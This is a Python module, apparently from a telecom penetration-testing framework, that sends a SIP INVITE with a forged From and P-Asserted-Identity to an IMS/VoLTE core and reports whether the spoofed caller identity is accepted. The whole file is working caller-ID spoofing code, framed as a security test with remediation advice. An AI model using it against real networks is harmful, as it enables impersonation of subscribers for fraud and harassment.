#!/usr/bin/env python3
'''
SIP INVITE Identity Spoofing (IMS/VoLTE access layer).

Sends an INVITE to the target with a caller identity (From / P-Asserted-Identity)
that does not belong to the sending endpoint. If the core accepts it (1xx/2xx
rather than a 403), it is not validating that the asserted identity matches the
authenticated subscriber - enabling Caller-ID / calling-party spoofing.

    main(config_file, target, listening, verbosity, output_file)
'''
from sip.sip_core.sip_config_parser import SipConfig
from sip.sip_core.sip_message import build_request
from sip.sip_core.sip_transport import probe
from sip.commons.utilities import logOk, logErr, logWarn, logInfo

TAG = 'SIP-INVITE-SPOOF'

SDP_BODY = (
    "v=0\r\n"
    "o=sigploit 0 0 IN IP4 %(host)s\r\n"
    "s=SigPloit\r\n"
    "c=IN IP4 %(host)s\r\n"
    "t=0 0\r\n"
    "m=audio 40000 RTP/AVP 0\r\n"
    "a=rtpmap:0 PCMU/8000\r\n"
)


def main(config_file, target, listening=True, verbosity=2, output_file=None):
    if not target:
        logErr('No target set. Use "set target <s-cscf-ip>".', TAG=TAG)
        return
    try:
        cfg = SipConfig(config_file)
    except Exception as e:
        logErr('Bad config: %s' % e, TAG=TAG)
        return
    if not cfg.spoofed_user:
        logErr('Config must set "spoofed_user" (identity to impersonate).', TAG=TAG)
        return

    to_uri = 'sip:%s@%s' % (cfg.to_user, cfg.domain)
    spoofed_from = 'sip:%s@%s' % (cfg.spoofed_user, cfg.domain)
    body = (SDP_BODY % {'host': cfg.local_host}).encode('utf-8')

    req = build_request(
        'INVITE', to_uri, spoofed_from, to_uri, cfg.local_host,
        local_port=cfg.local_port or 5060,
        contact='sip:%s@%s:%d' % (cfg.spoofed_user, cfg.local_host,
                                   cfg.local_port or 5060),
        extra_headers=[
            ('P-Asserted-Identity', '<%s>' % spoofed_from),
            ('Content-Type', 'application/sdp'),
        ],
        body=body)

    logInfo('Sending spoofed INVITE From=%s To=%s -> %s:%d'
            % (spoofed_from, to_uri, target, cfg.port), TAG=TAG)
    resp = probe(target, cfg.port, req, timeout=cfg.timeout)
    if resp is None:
        logInfo('No response to the spoofed INVITE.', TAG=TAG)
        return None

    status = resp['status_code']
    logInfo('Response: %d %s' % (status, resp['reason']), TAG=TAG)
    if status == 403:
        logOk('Target correctly rejected the spoofed identity (403 Forbidden).',
              TAG=TAG)
    elif status < 300:
        logWarn('Target ACCEPTED an INVITE with a spoofed identity (%s -> %s), '
                'HTTP-analogous %d %s. Recommendation: enforce P-Asserted-Identity '
                'validation against the authenticated subscriber (P-CSCF/IBCF '
                'identity assertion, STIR/SHAKEN where applicable).'
                % (spoofed_from, to_uri, status, resp['reason']), TAG=TAG)
    else:
        logInfo('Target returned %d %s (not accepted, not an explicit spoof '
                'rejection).' % (status, resp['reason']), TAG=TAG)
    return status
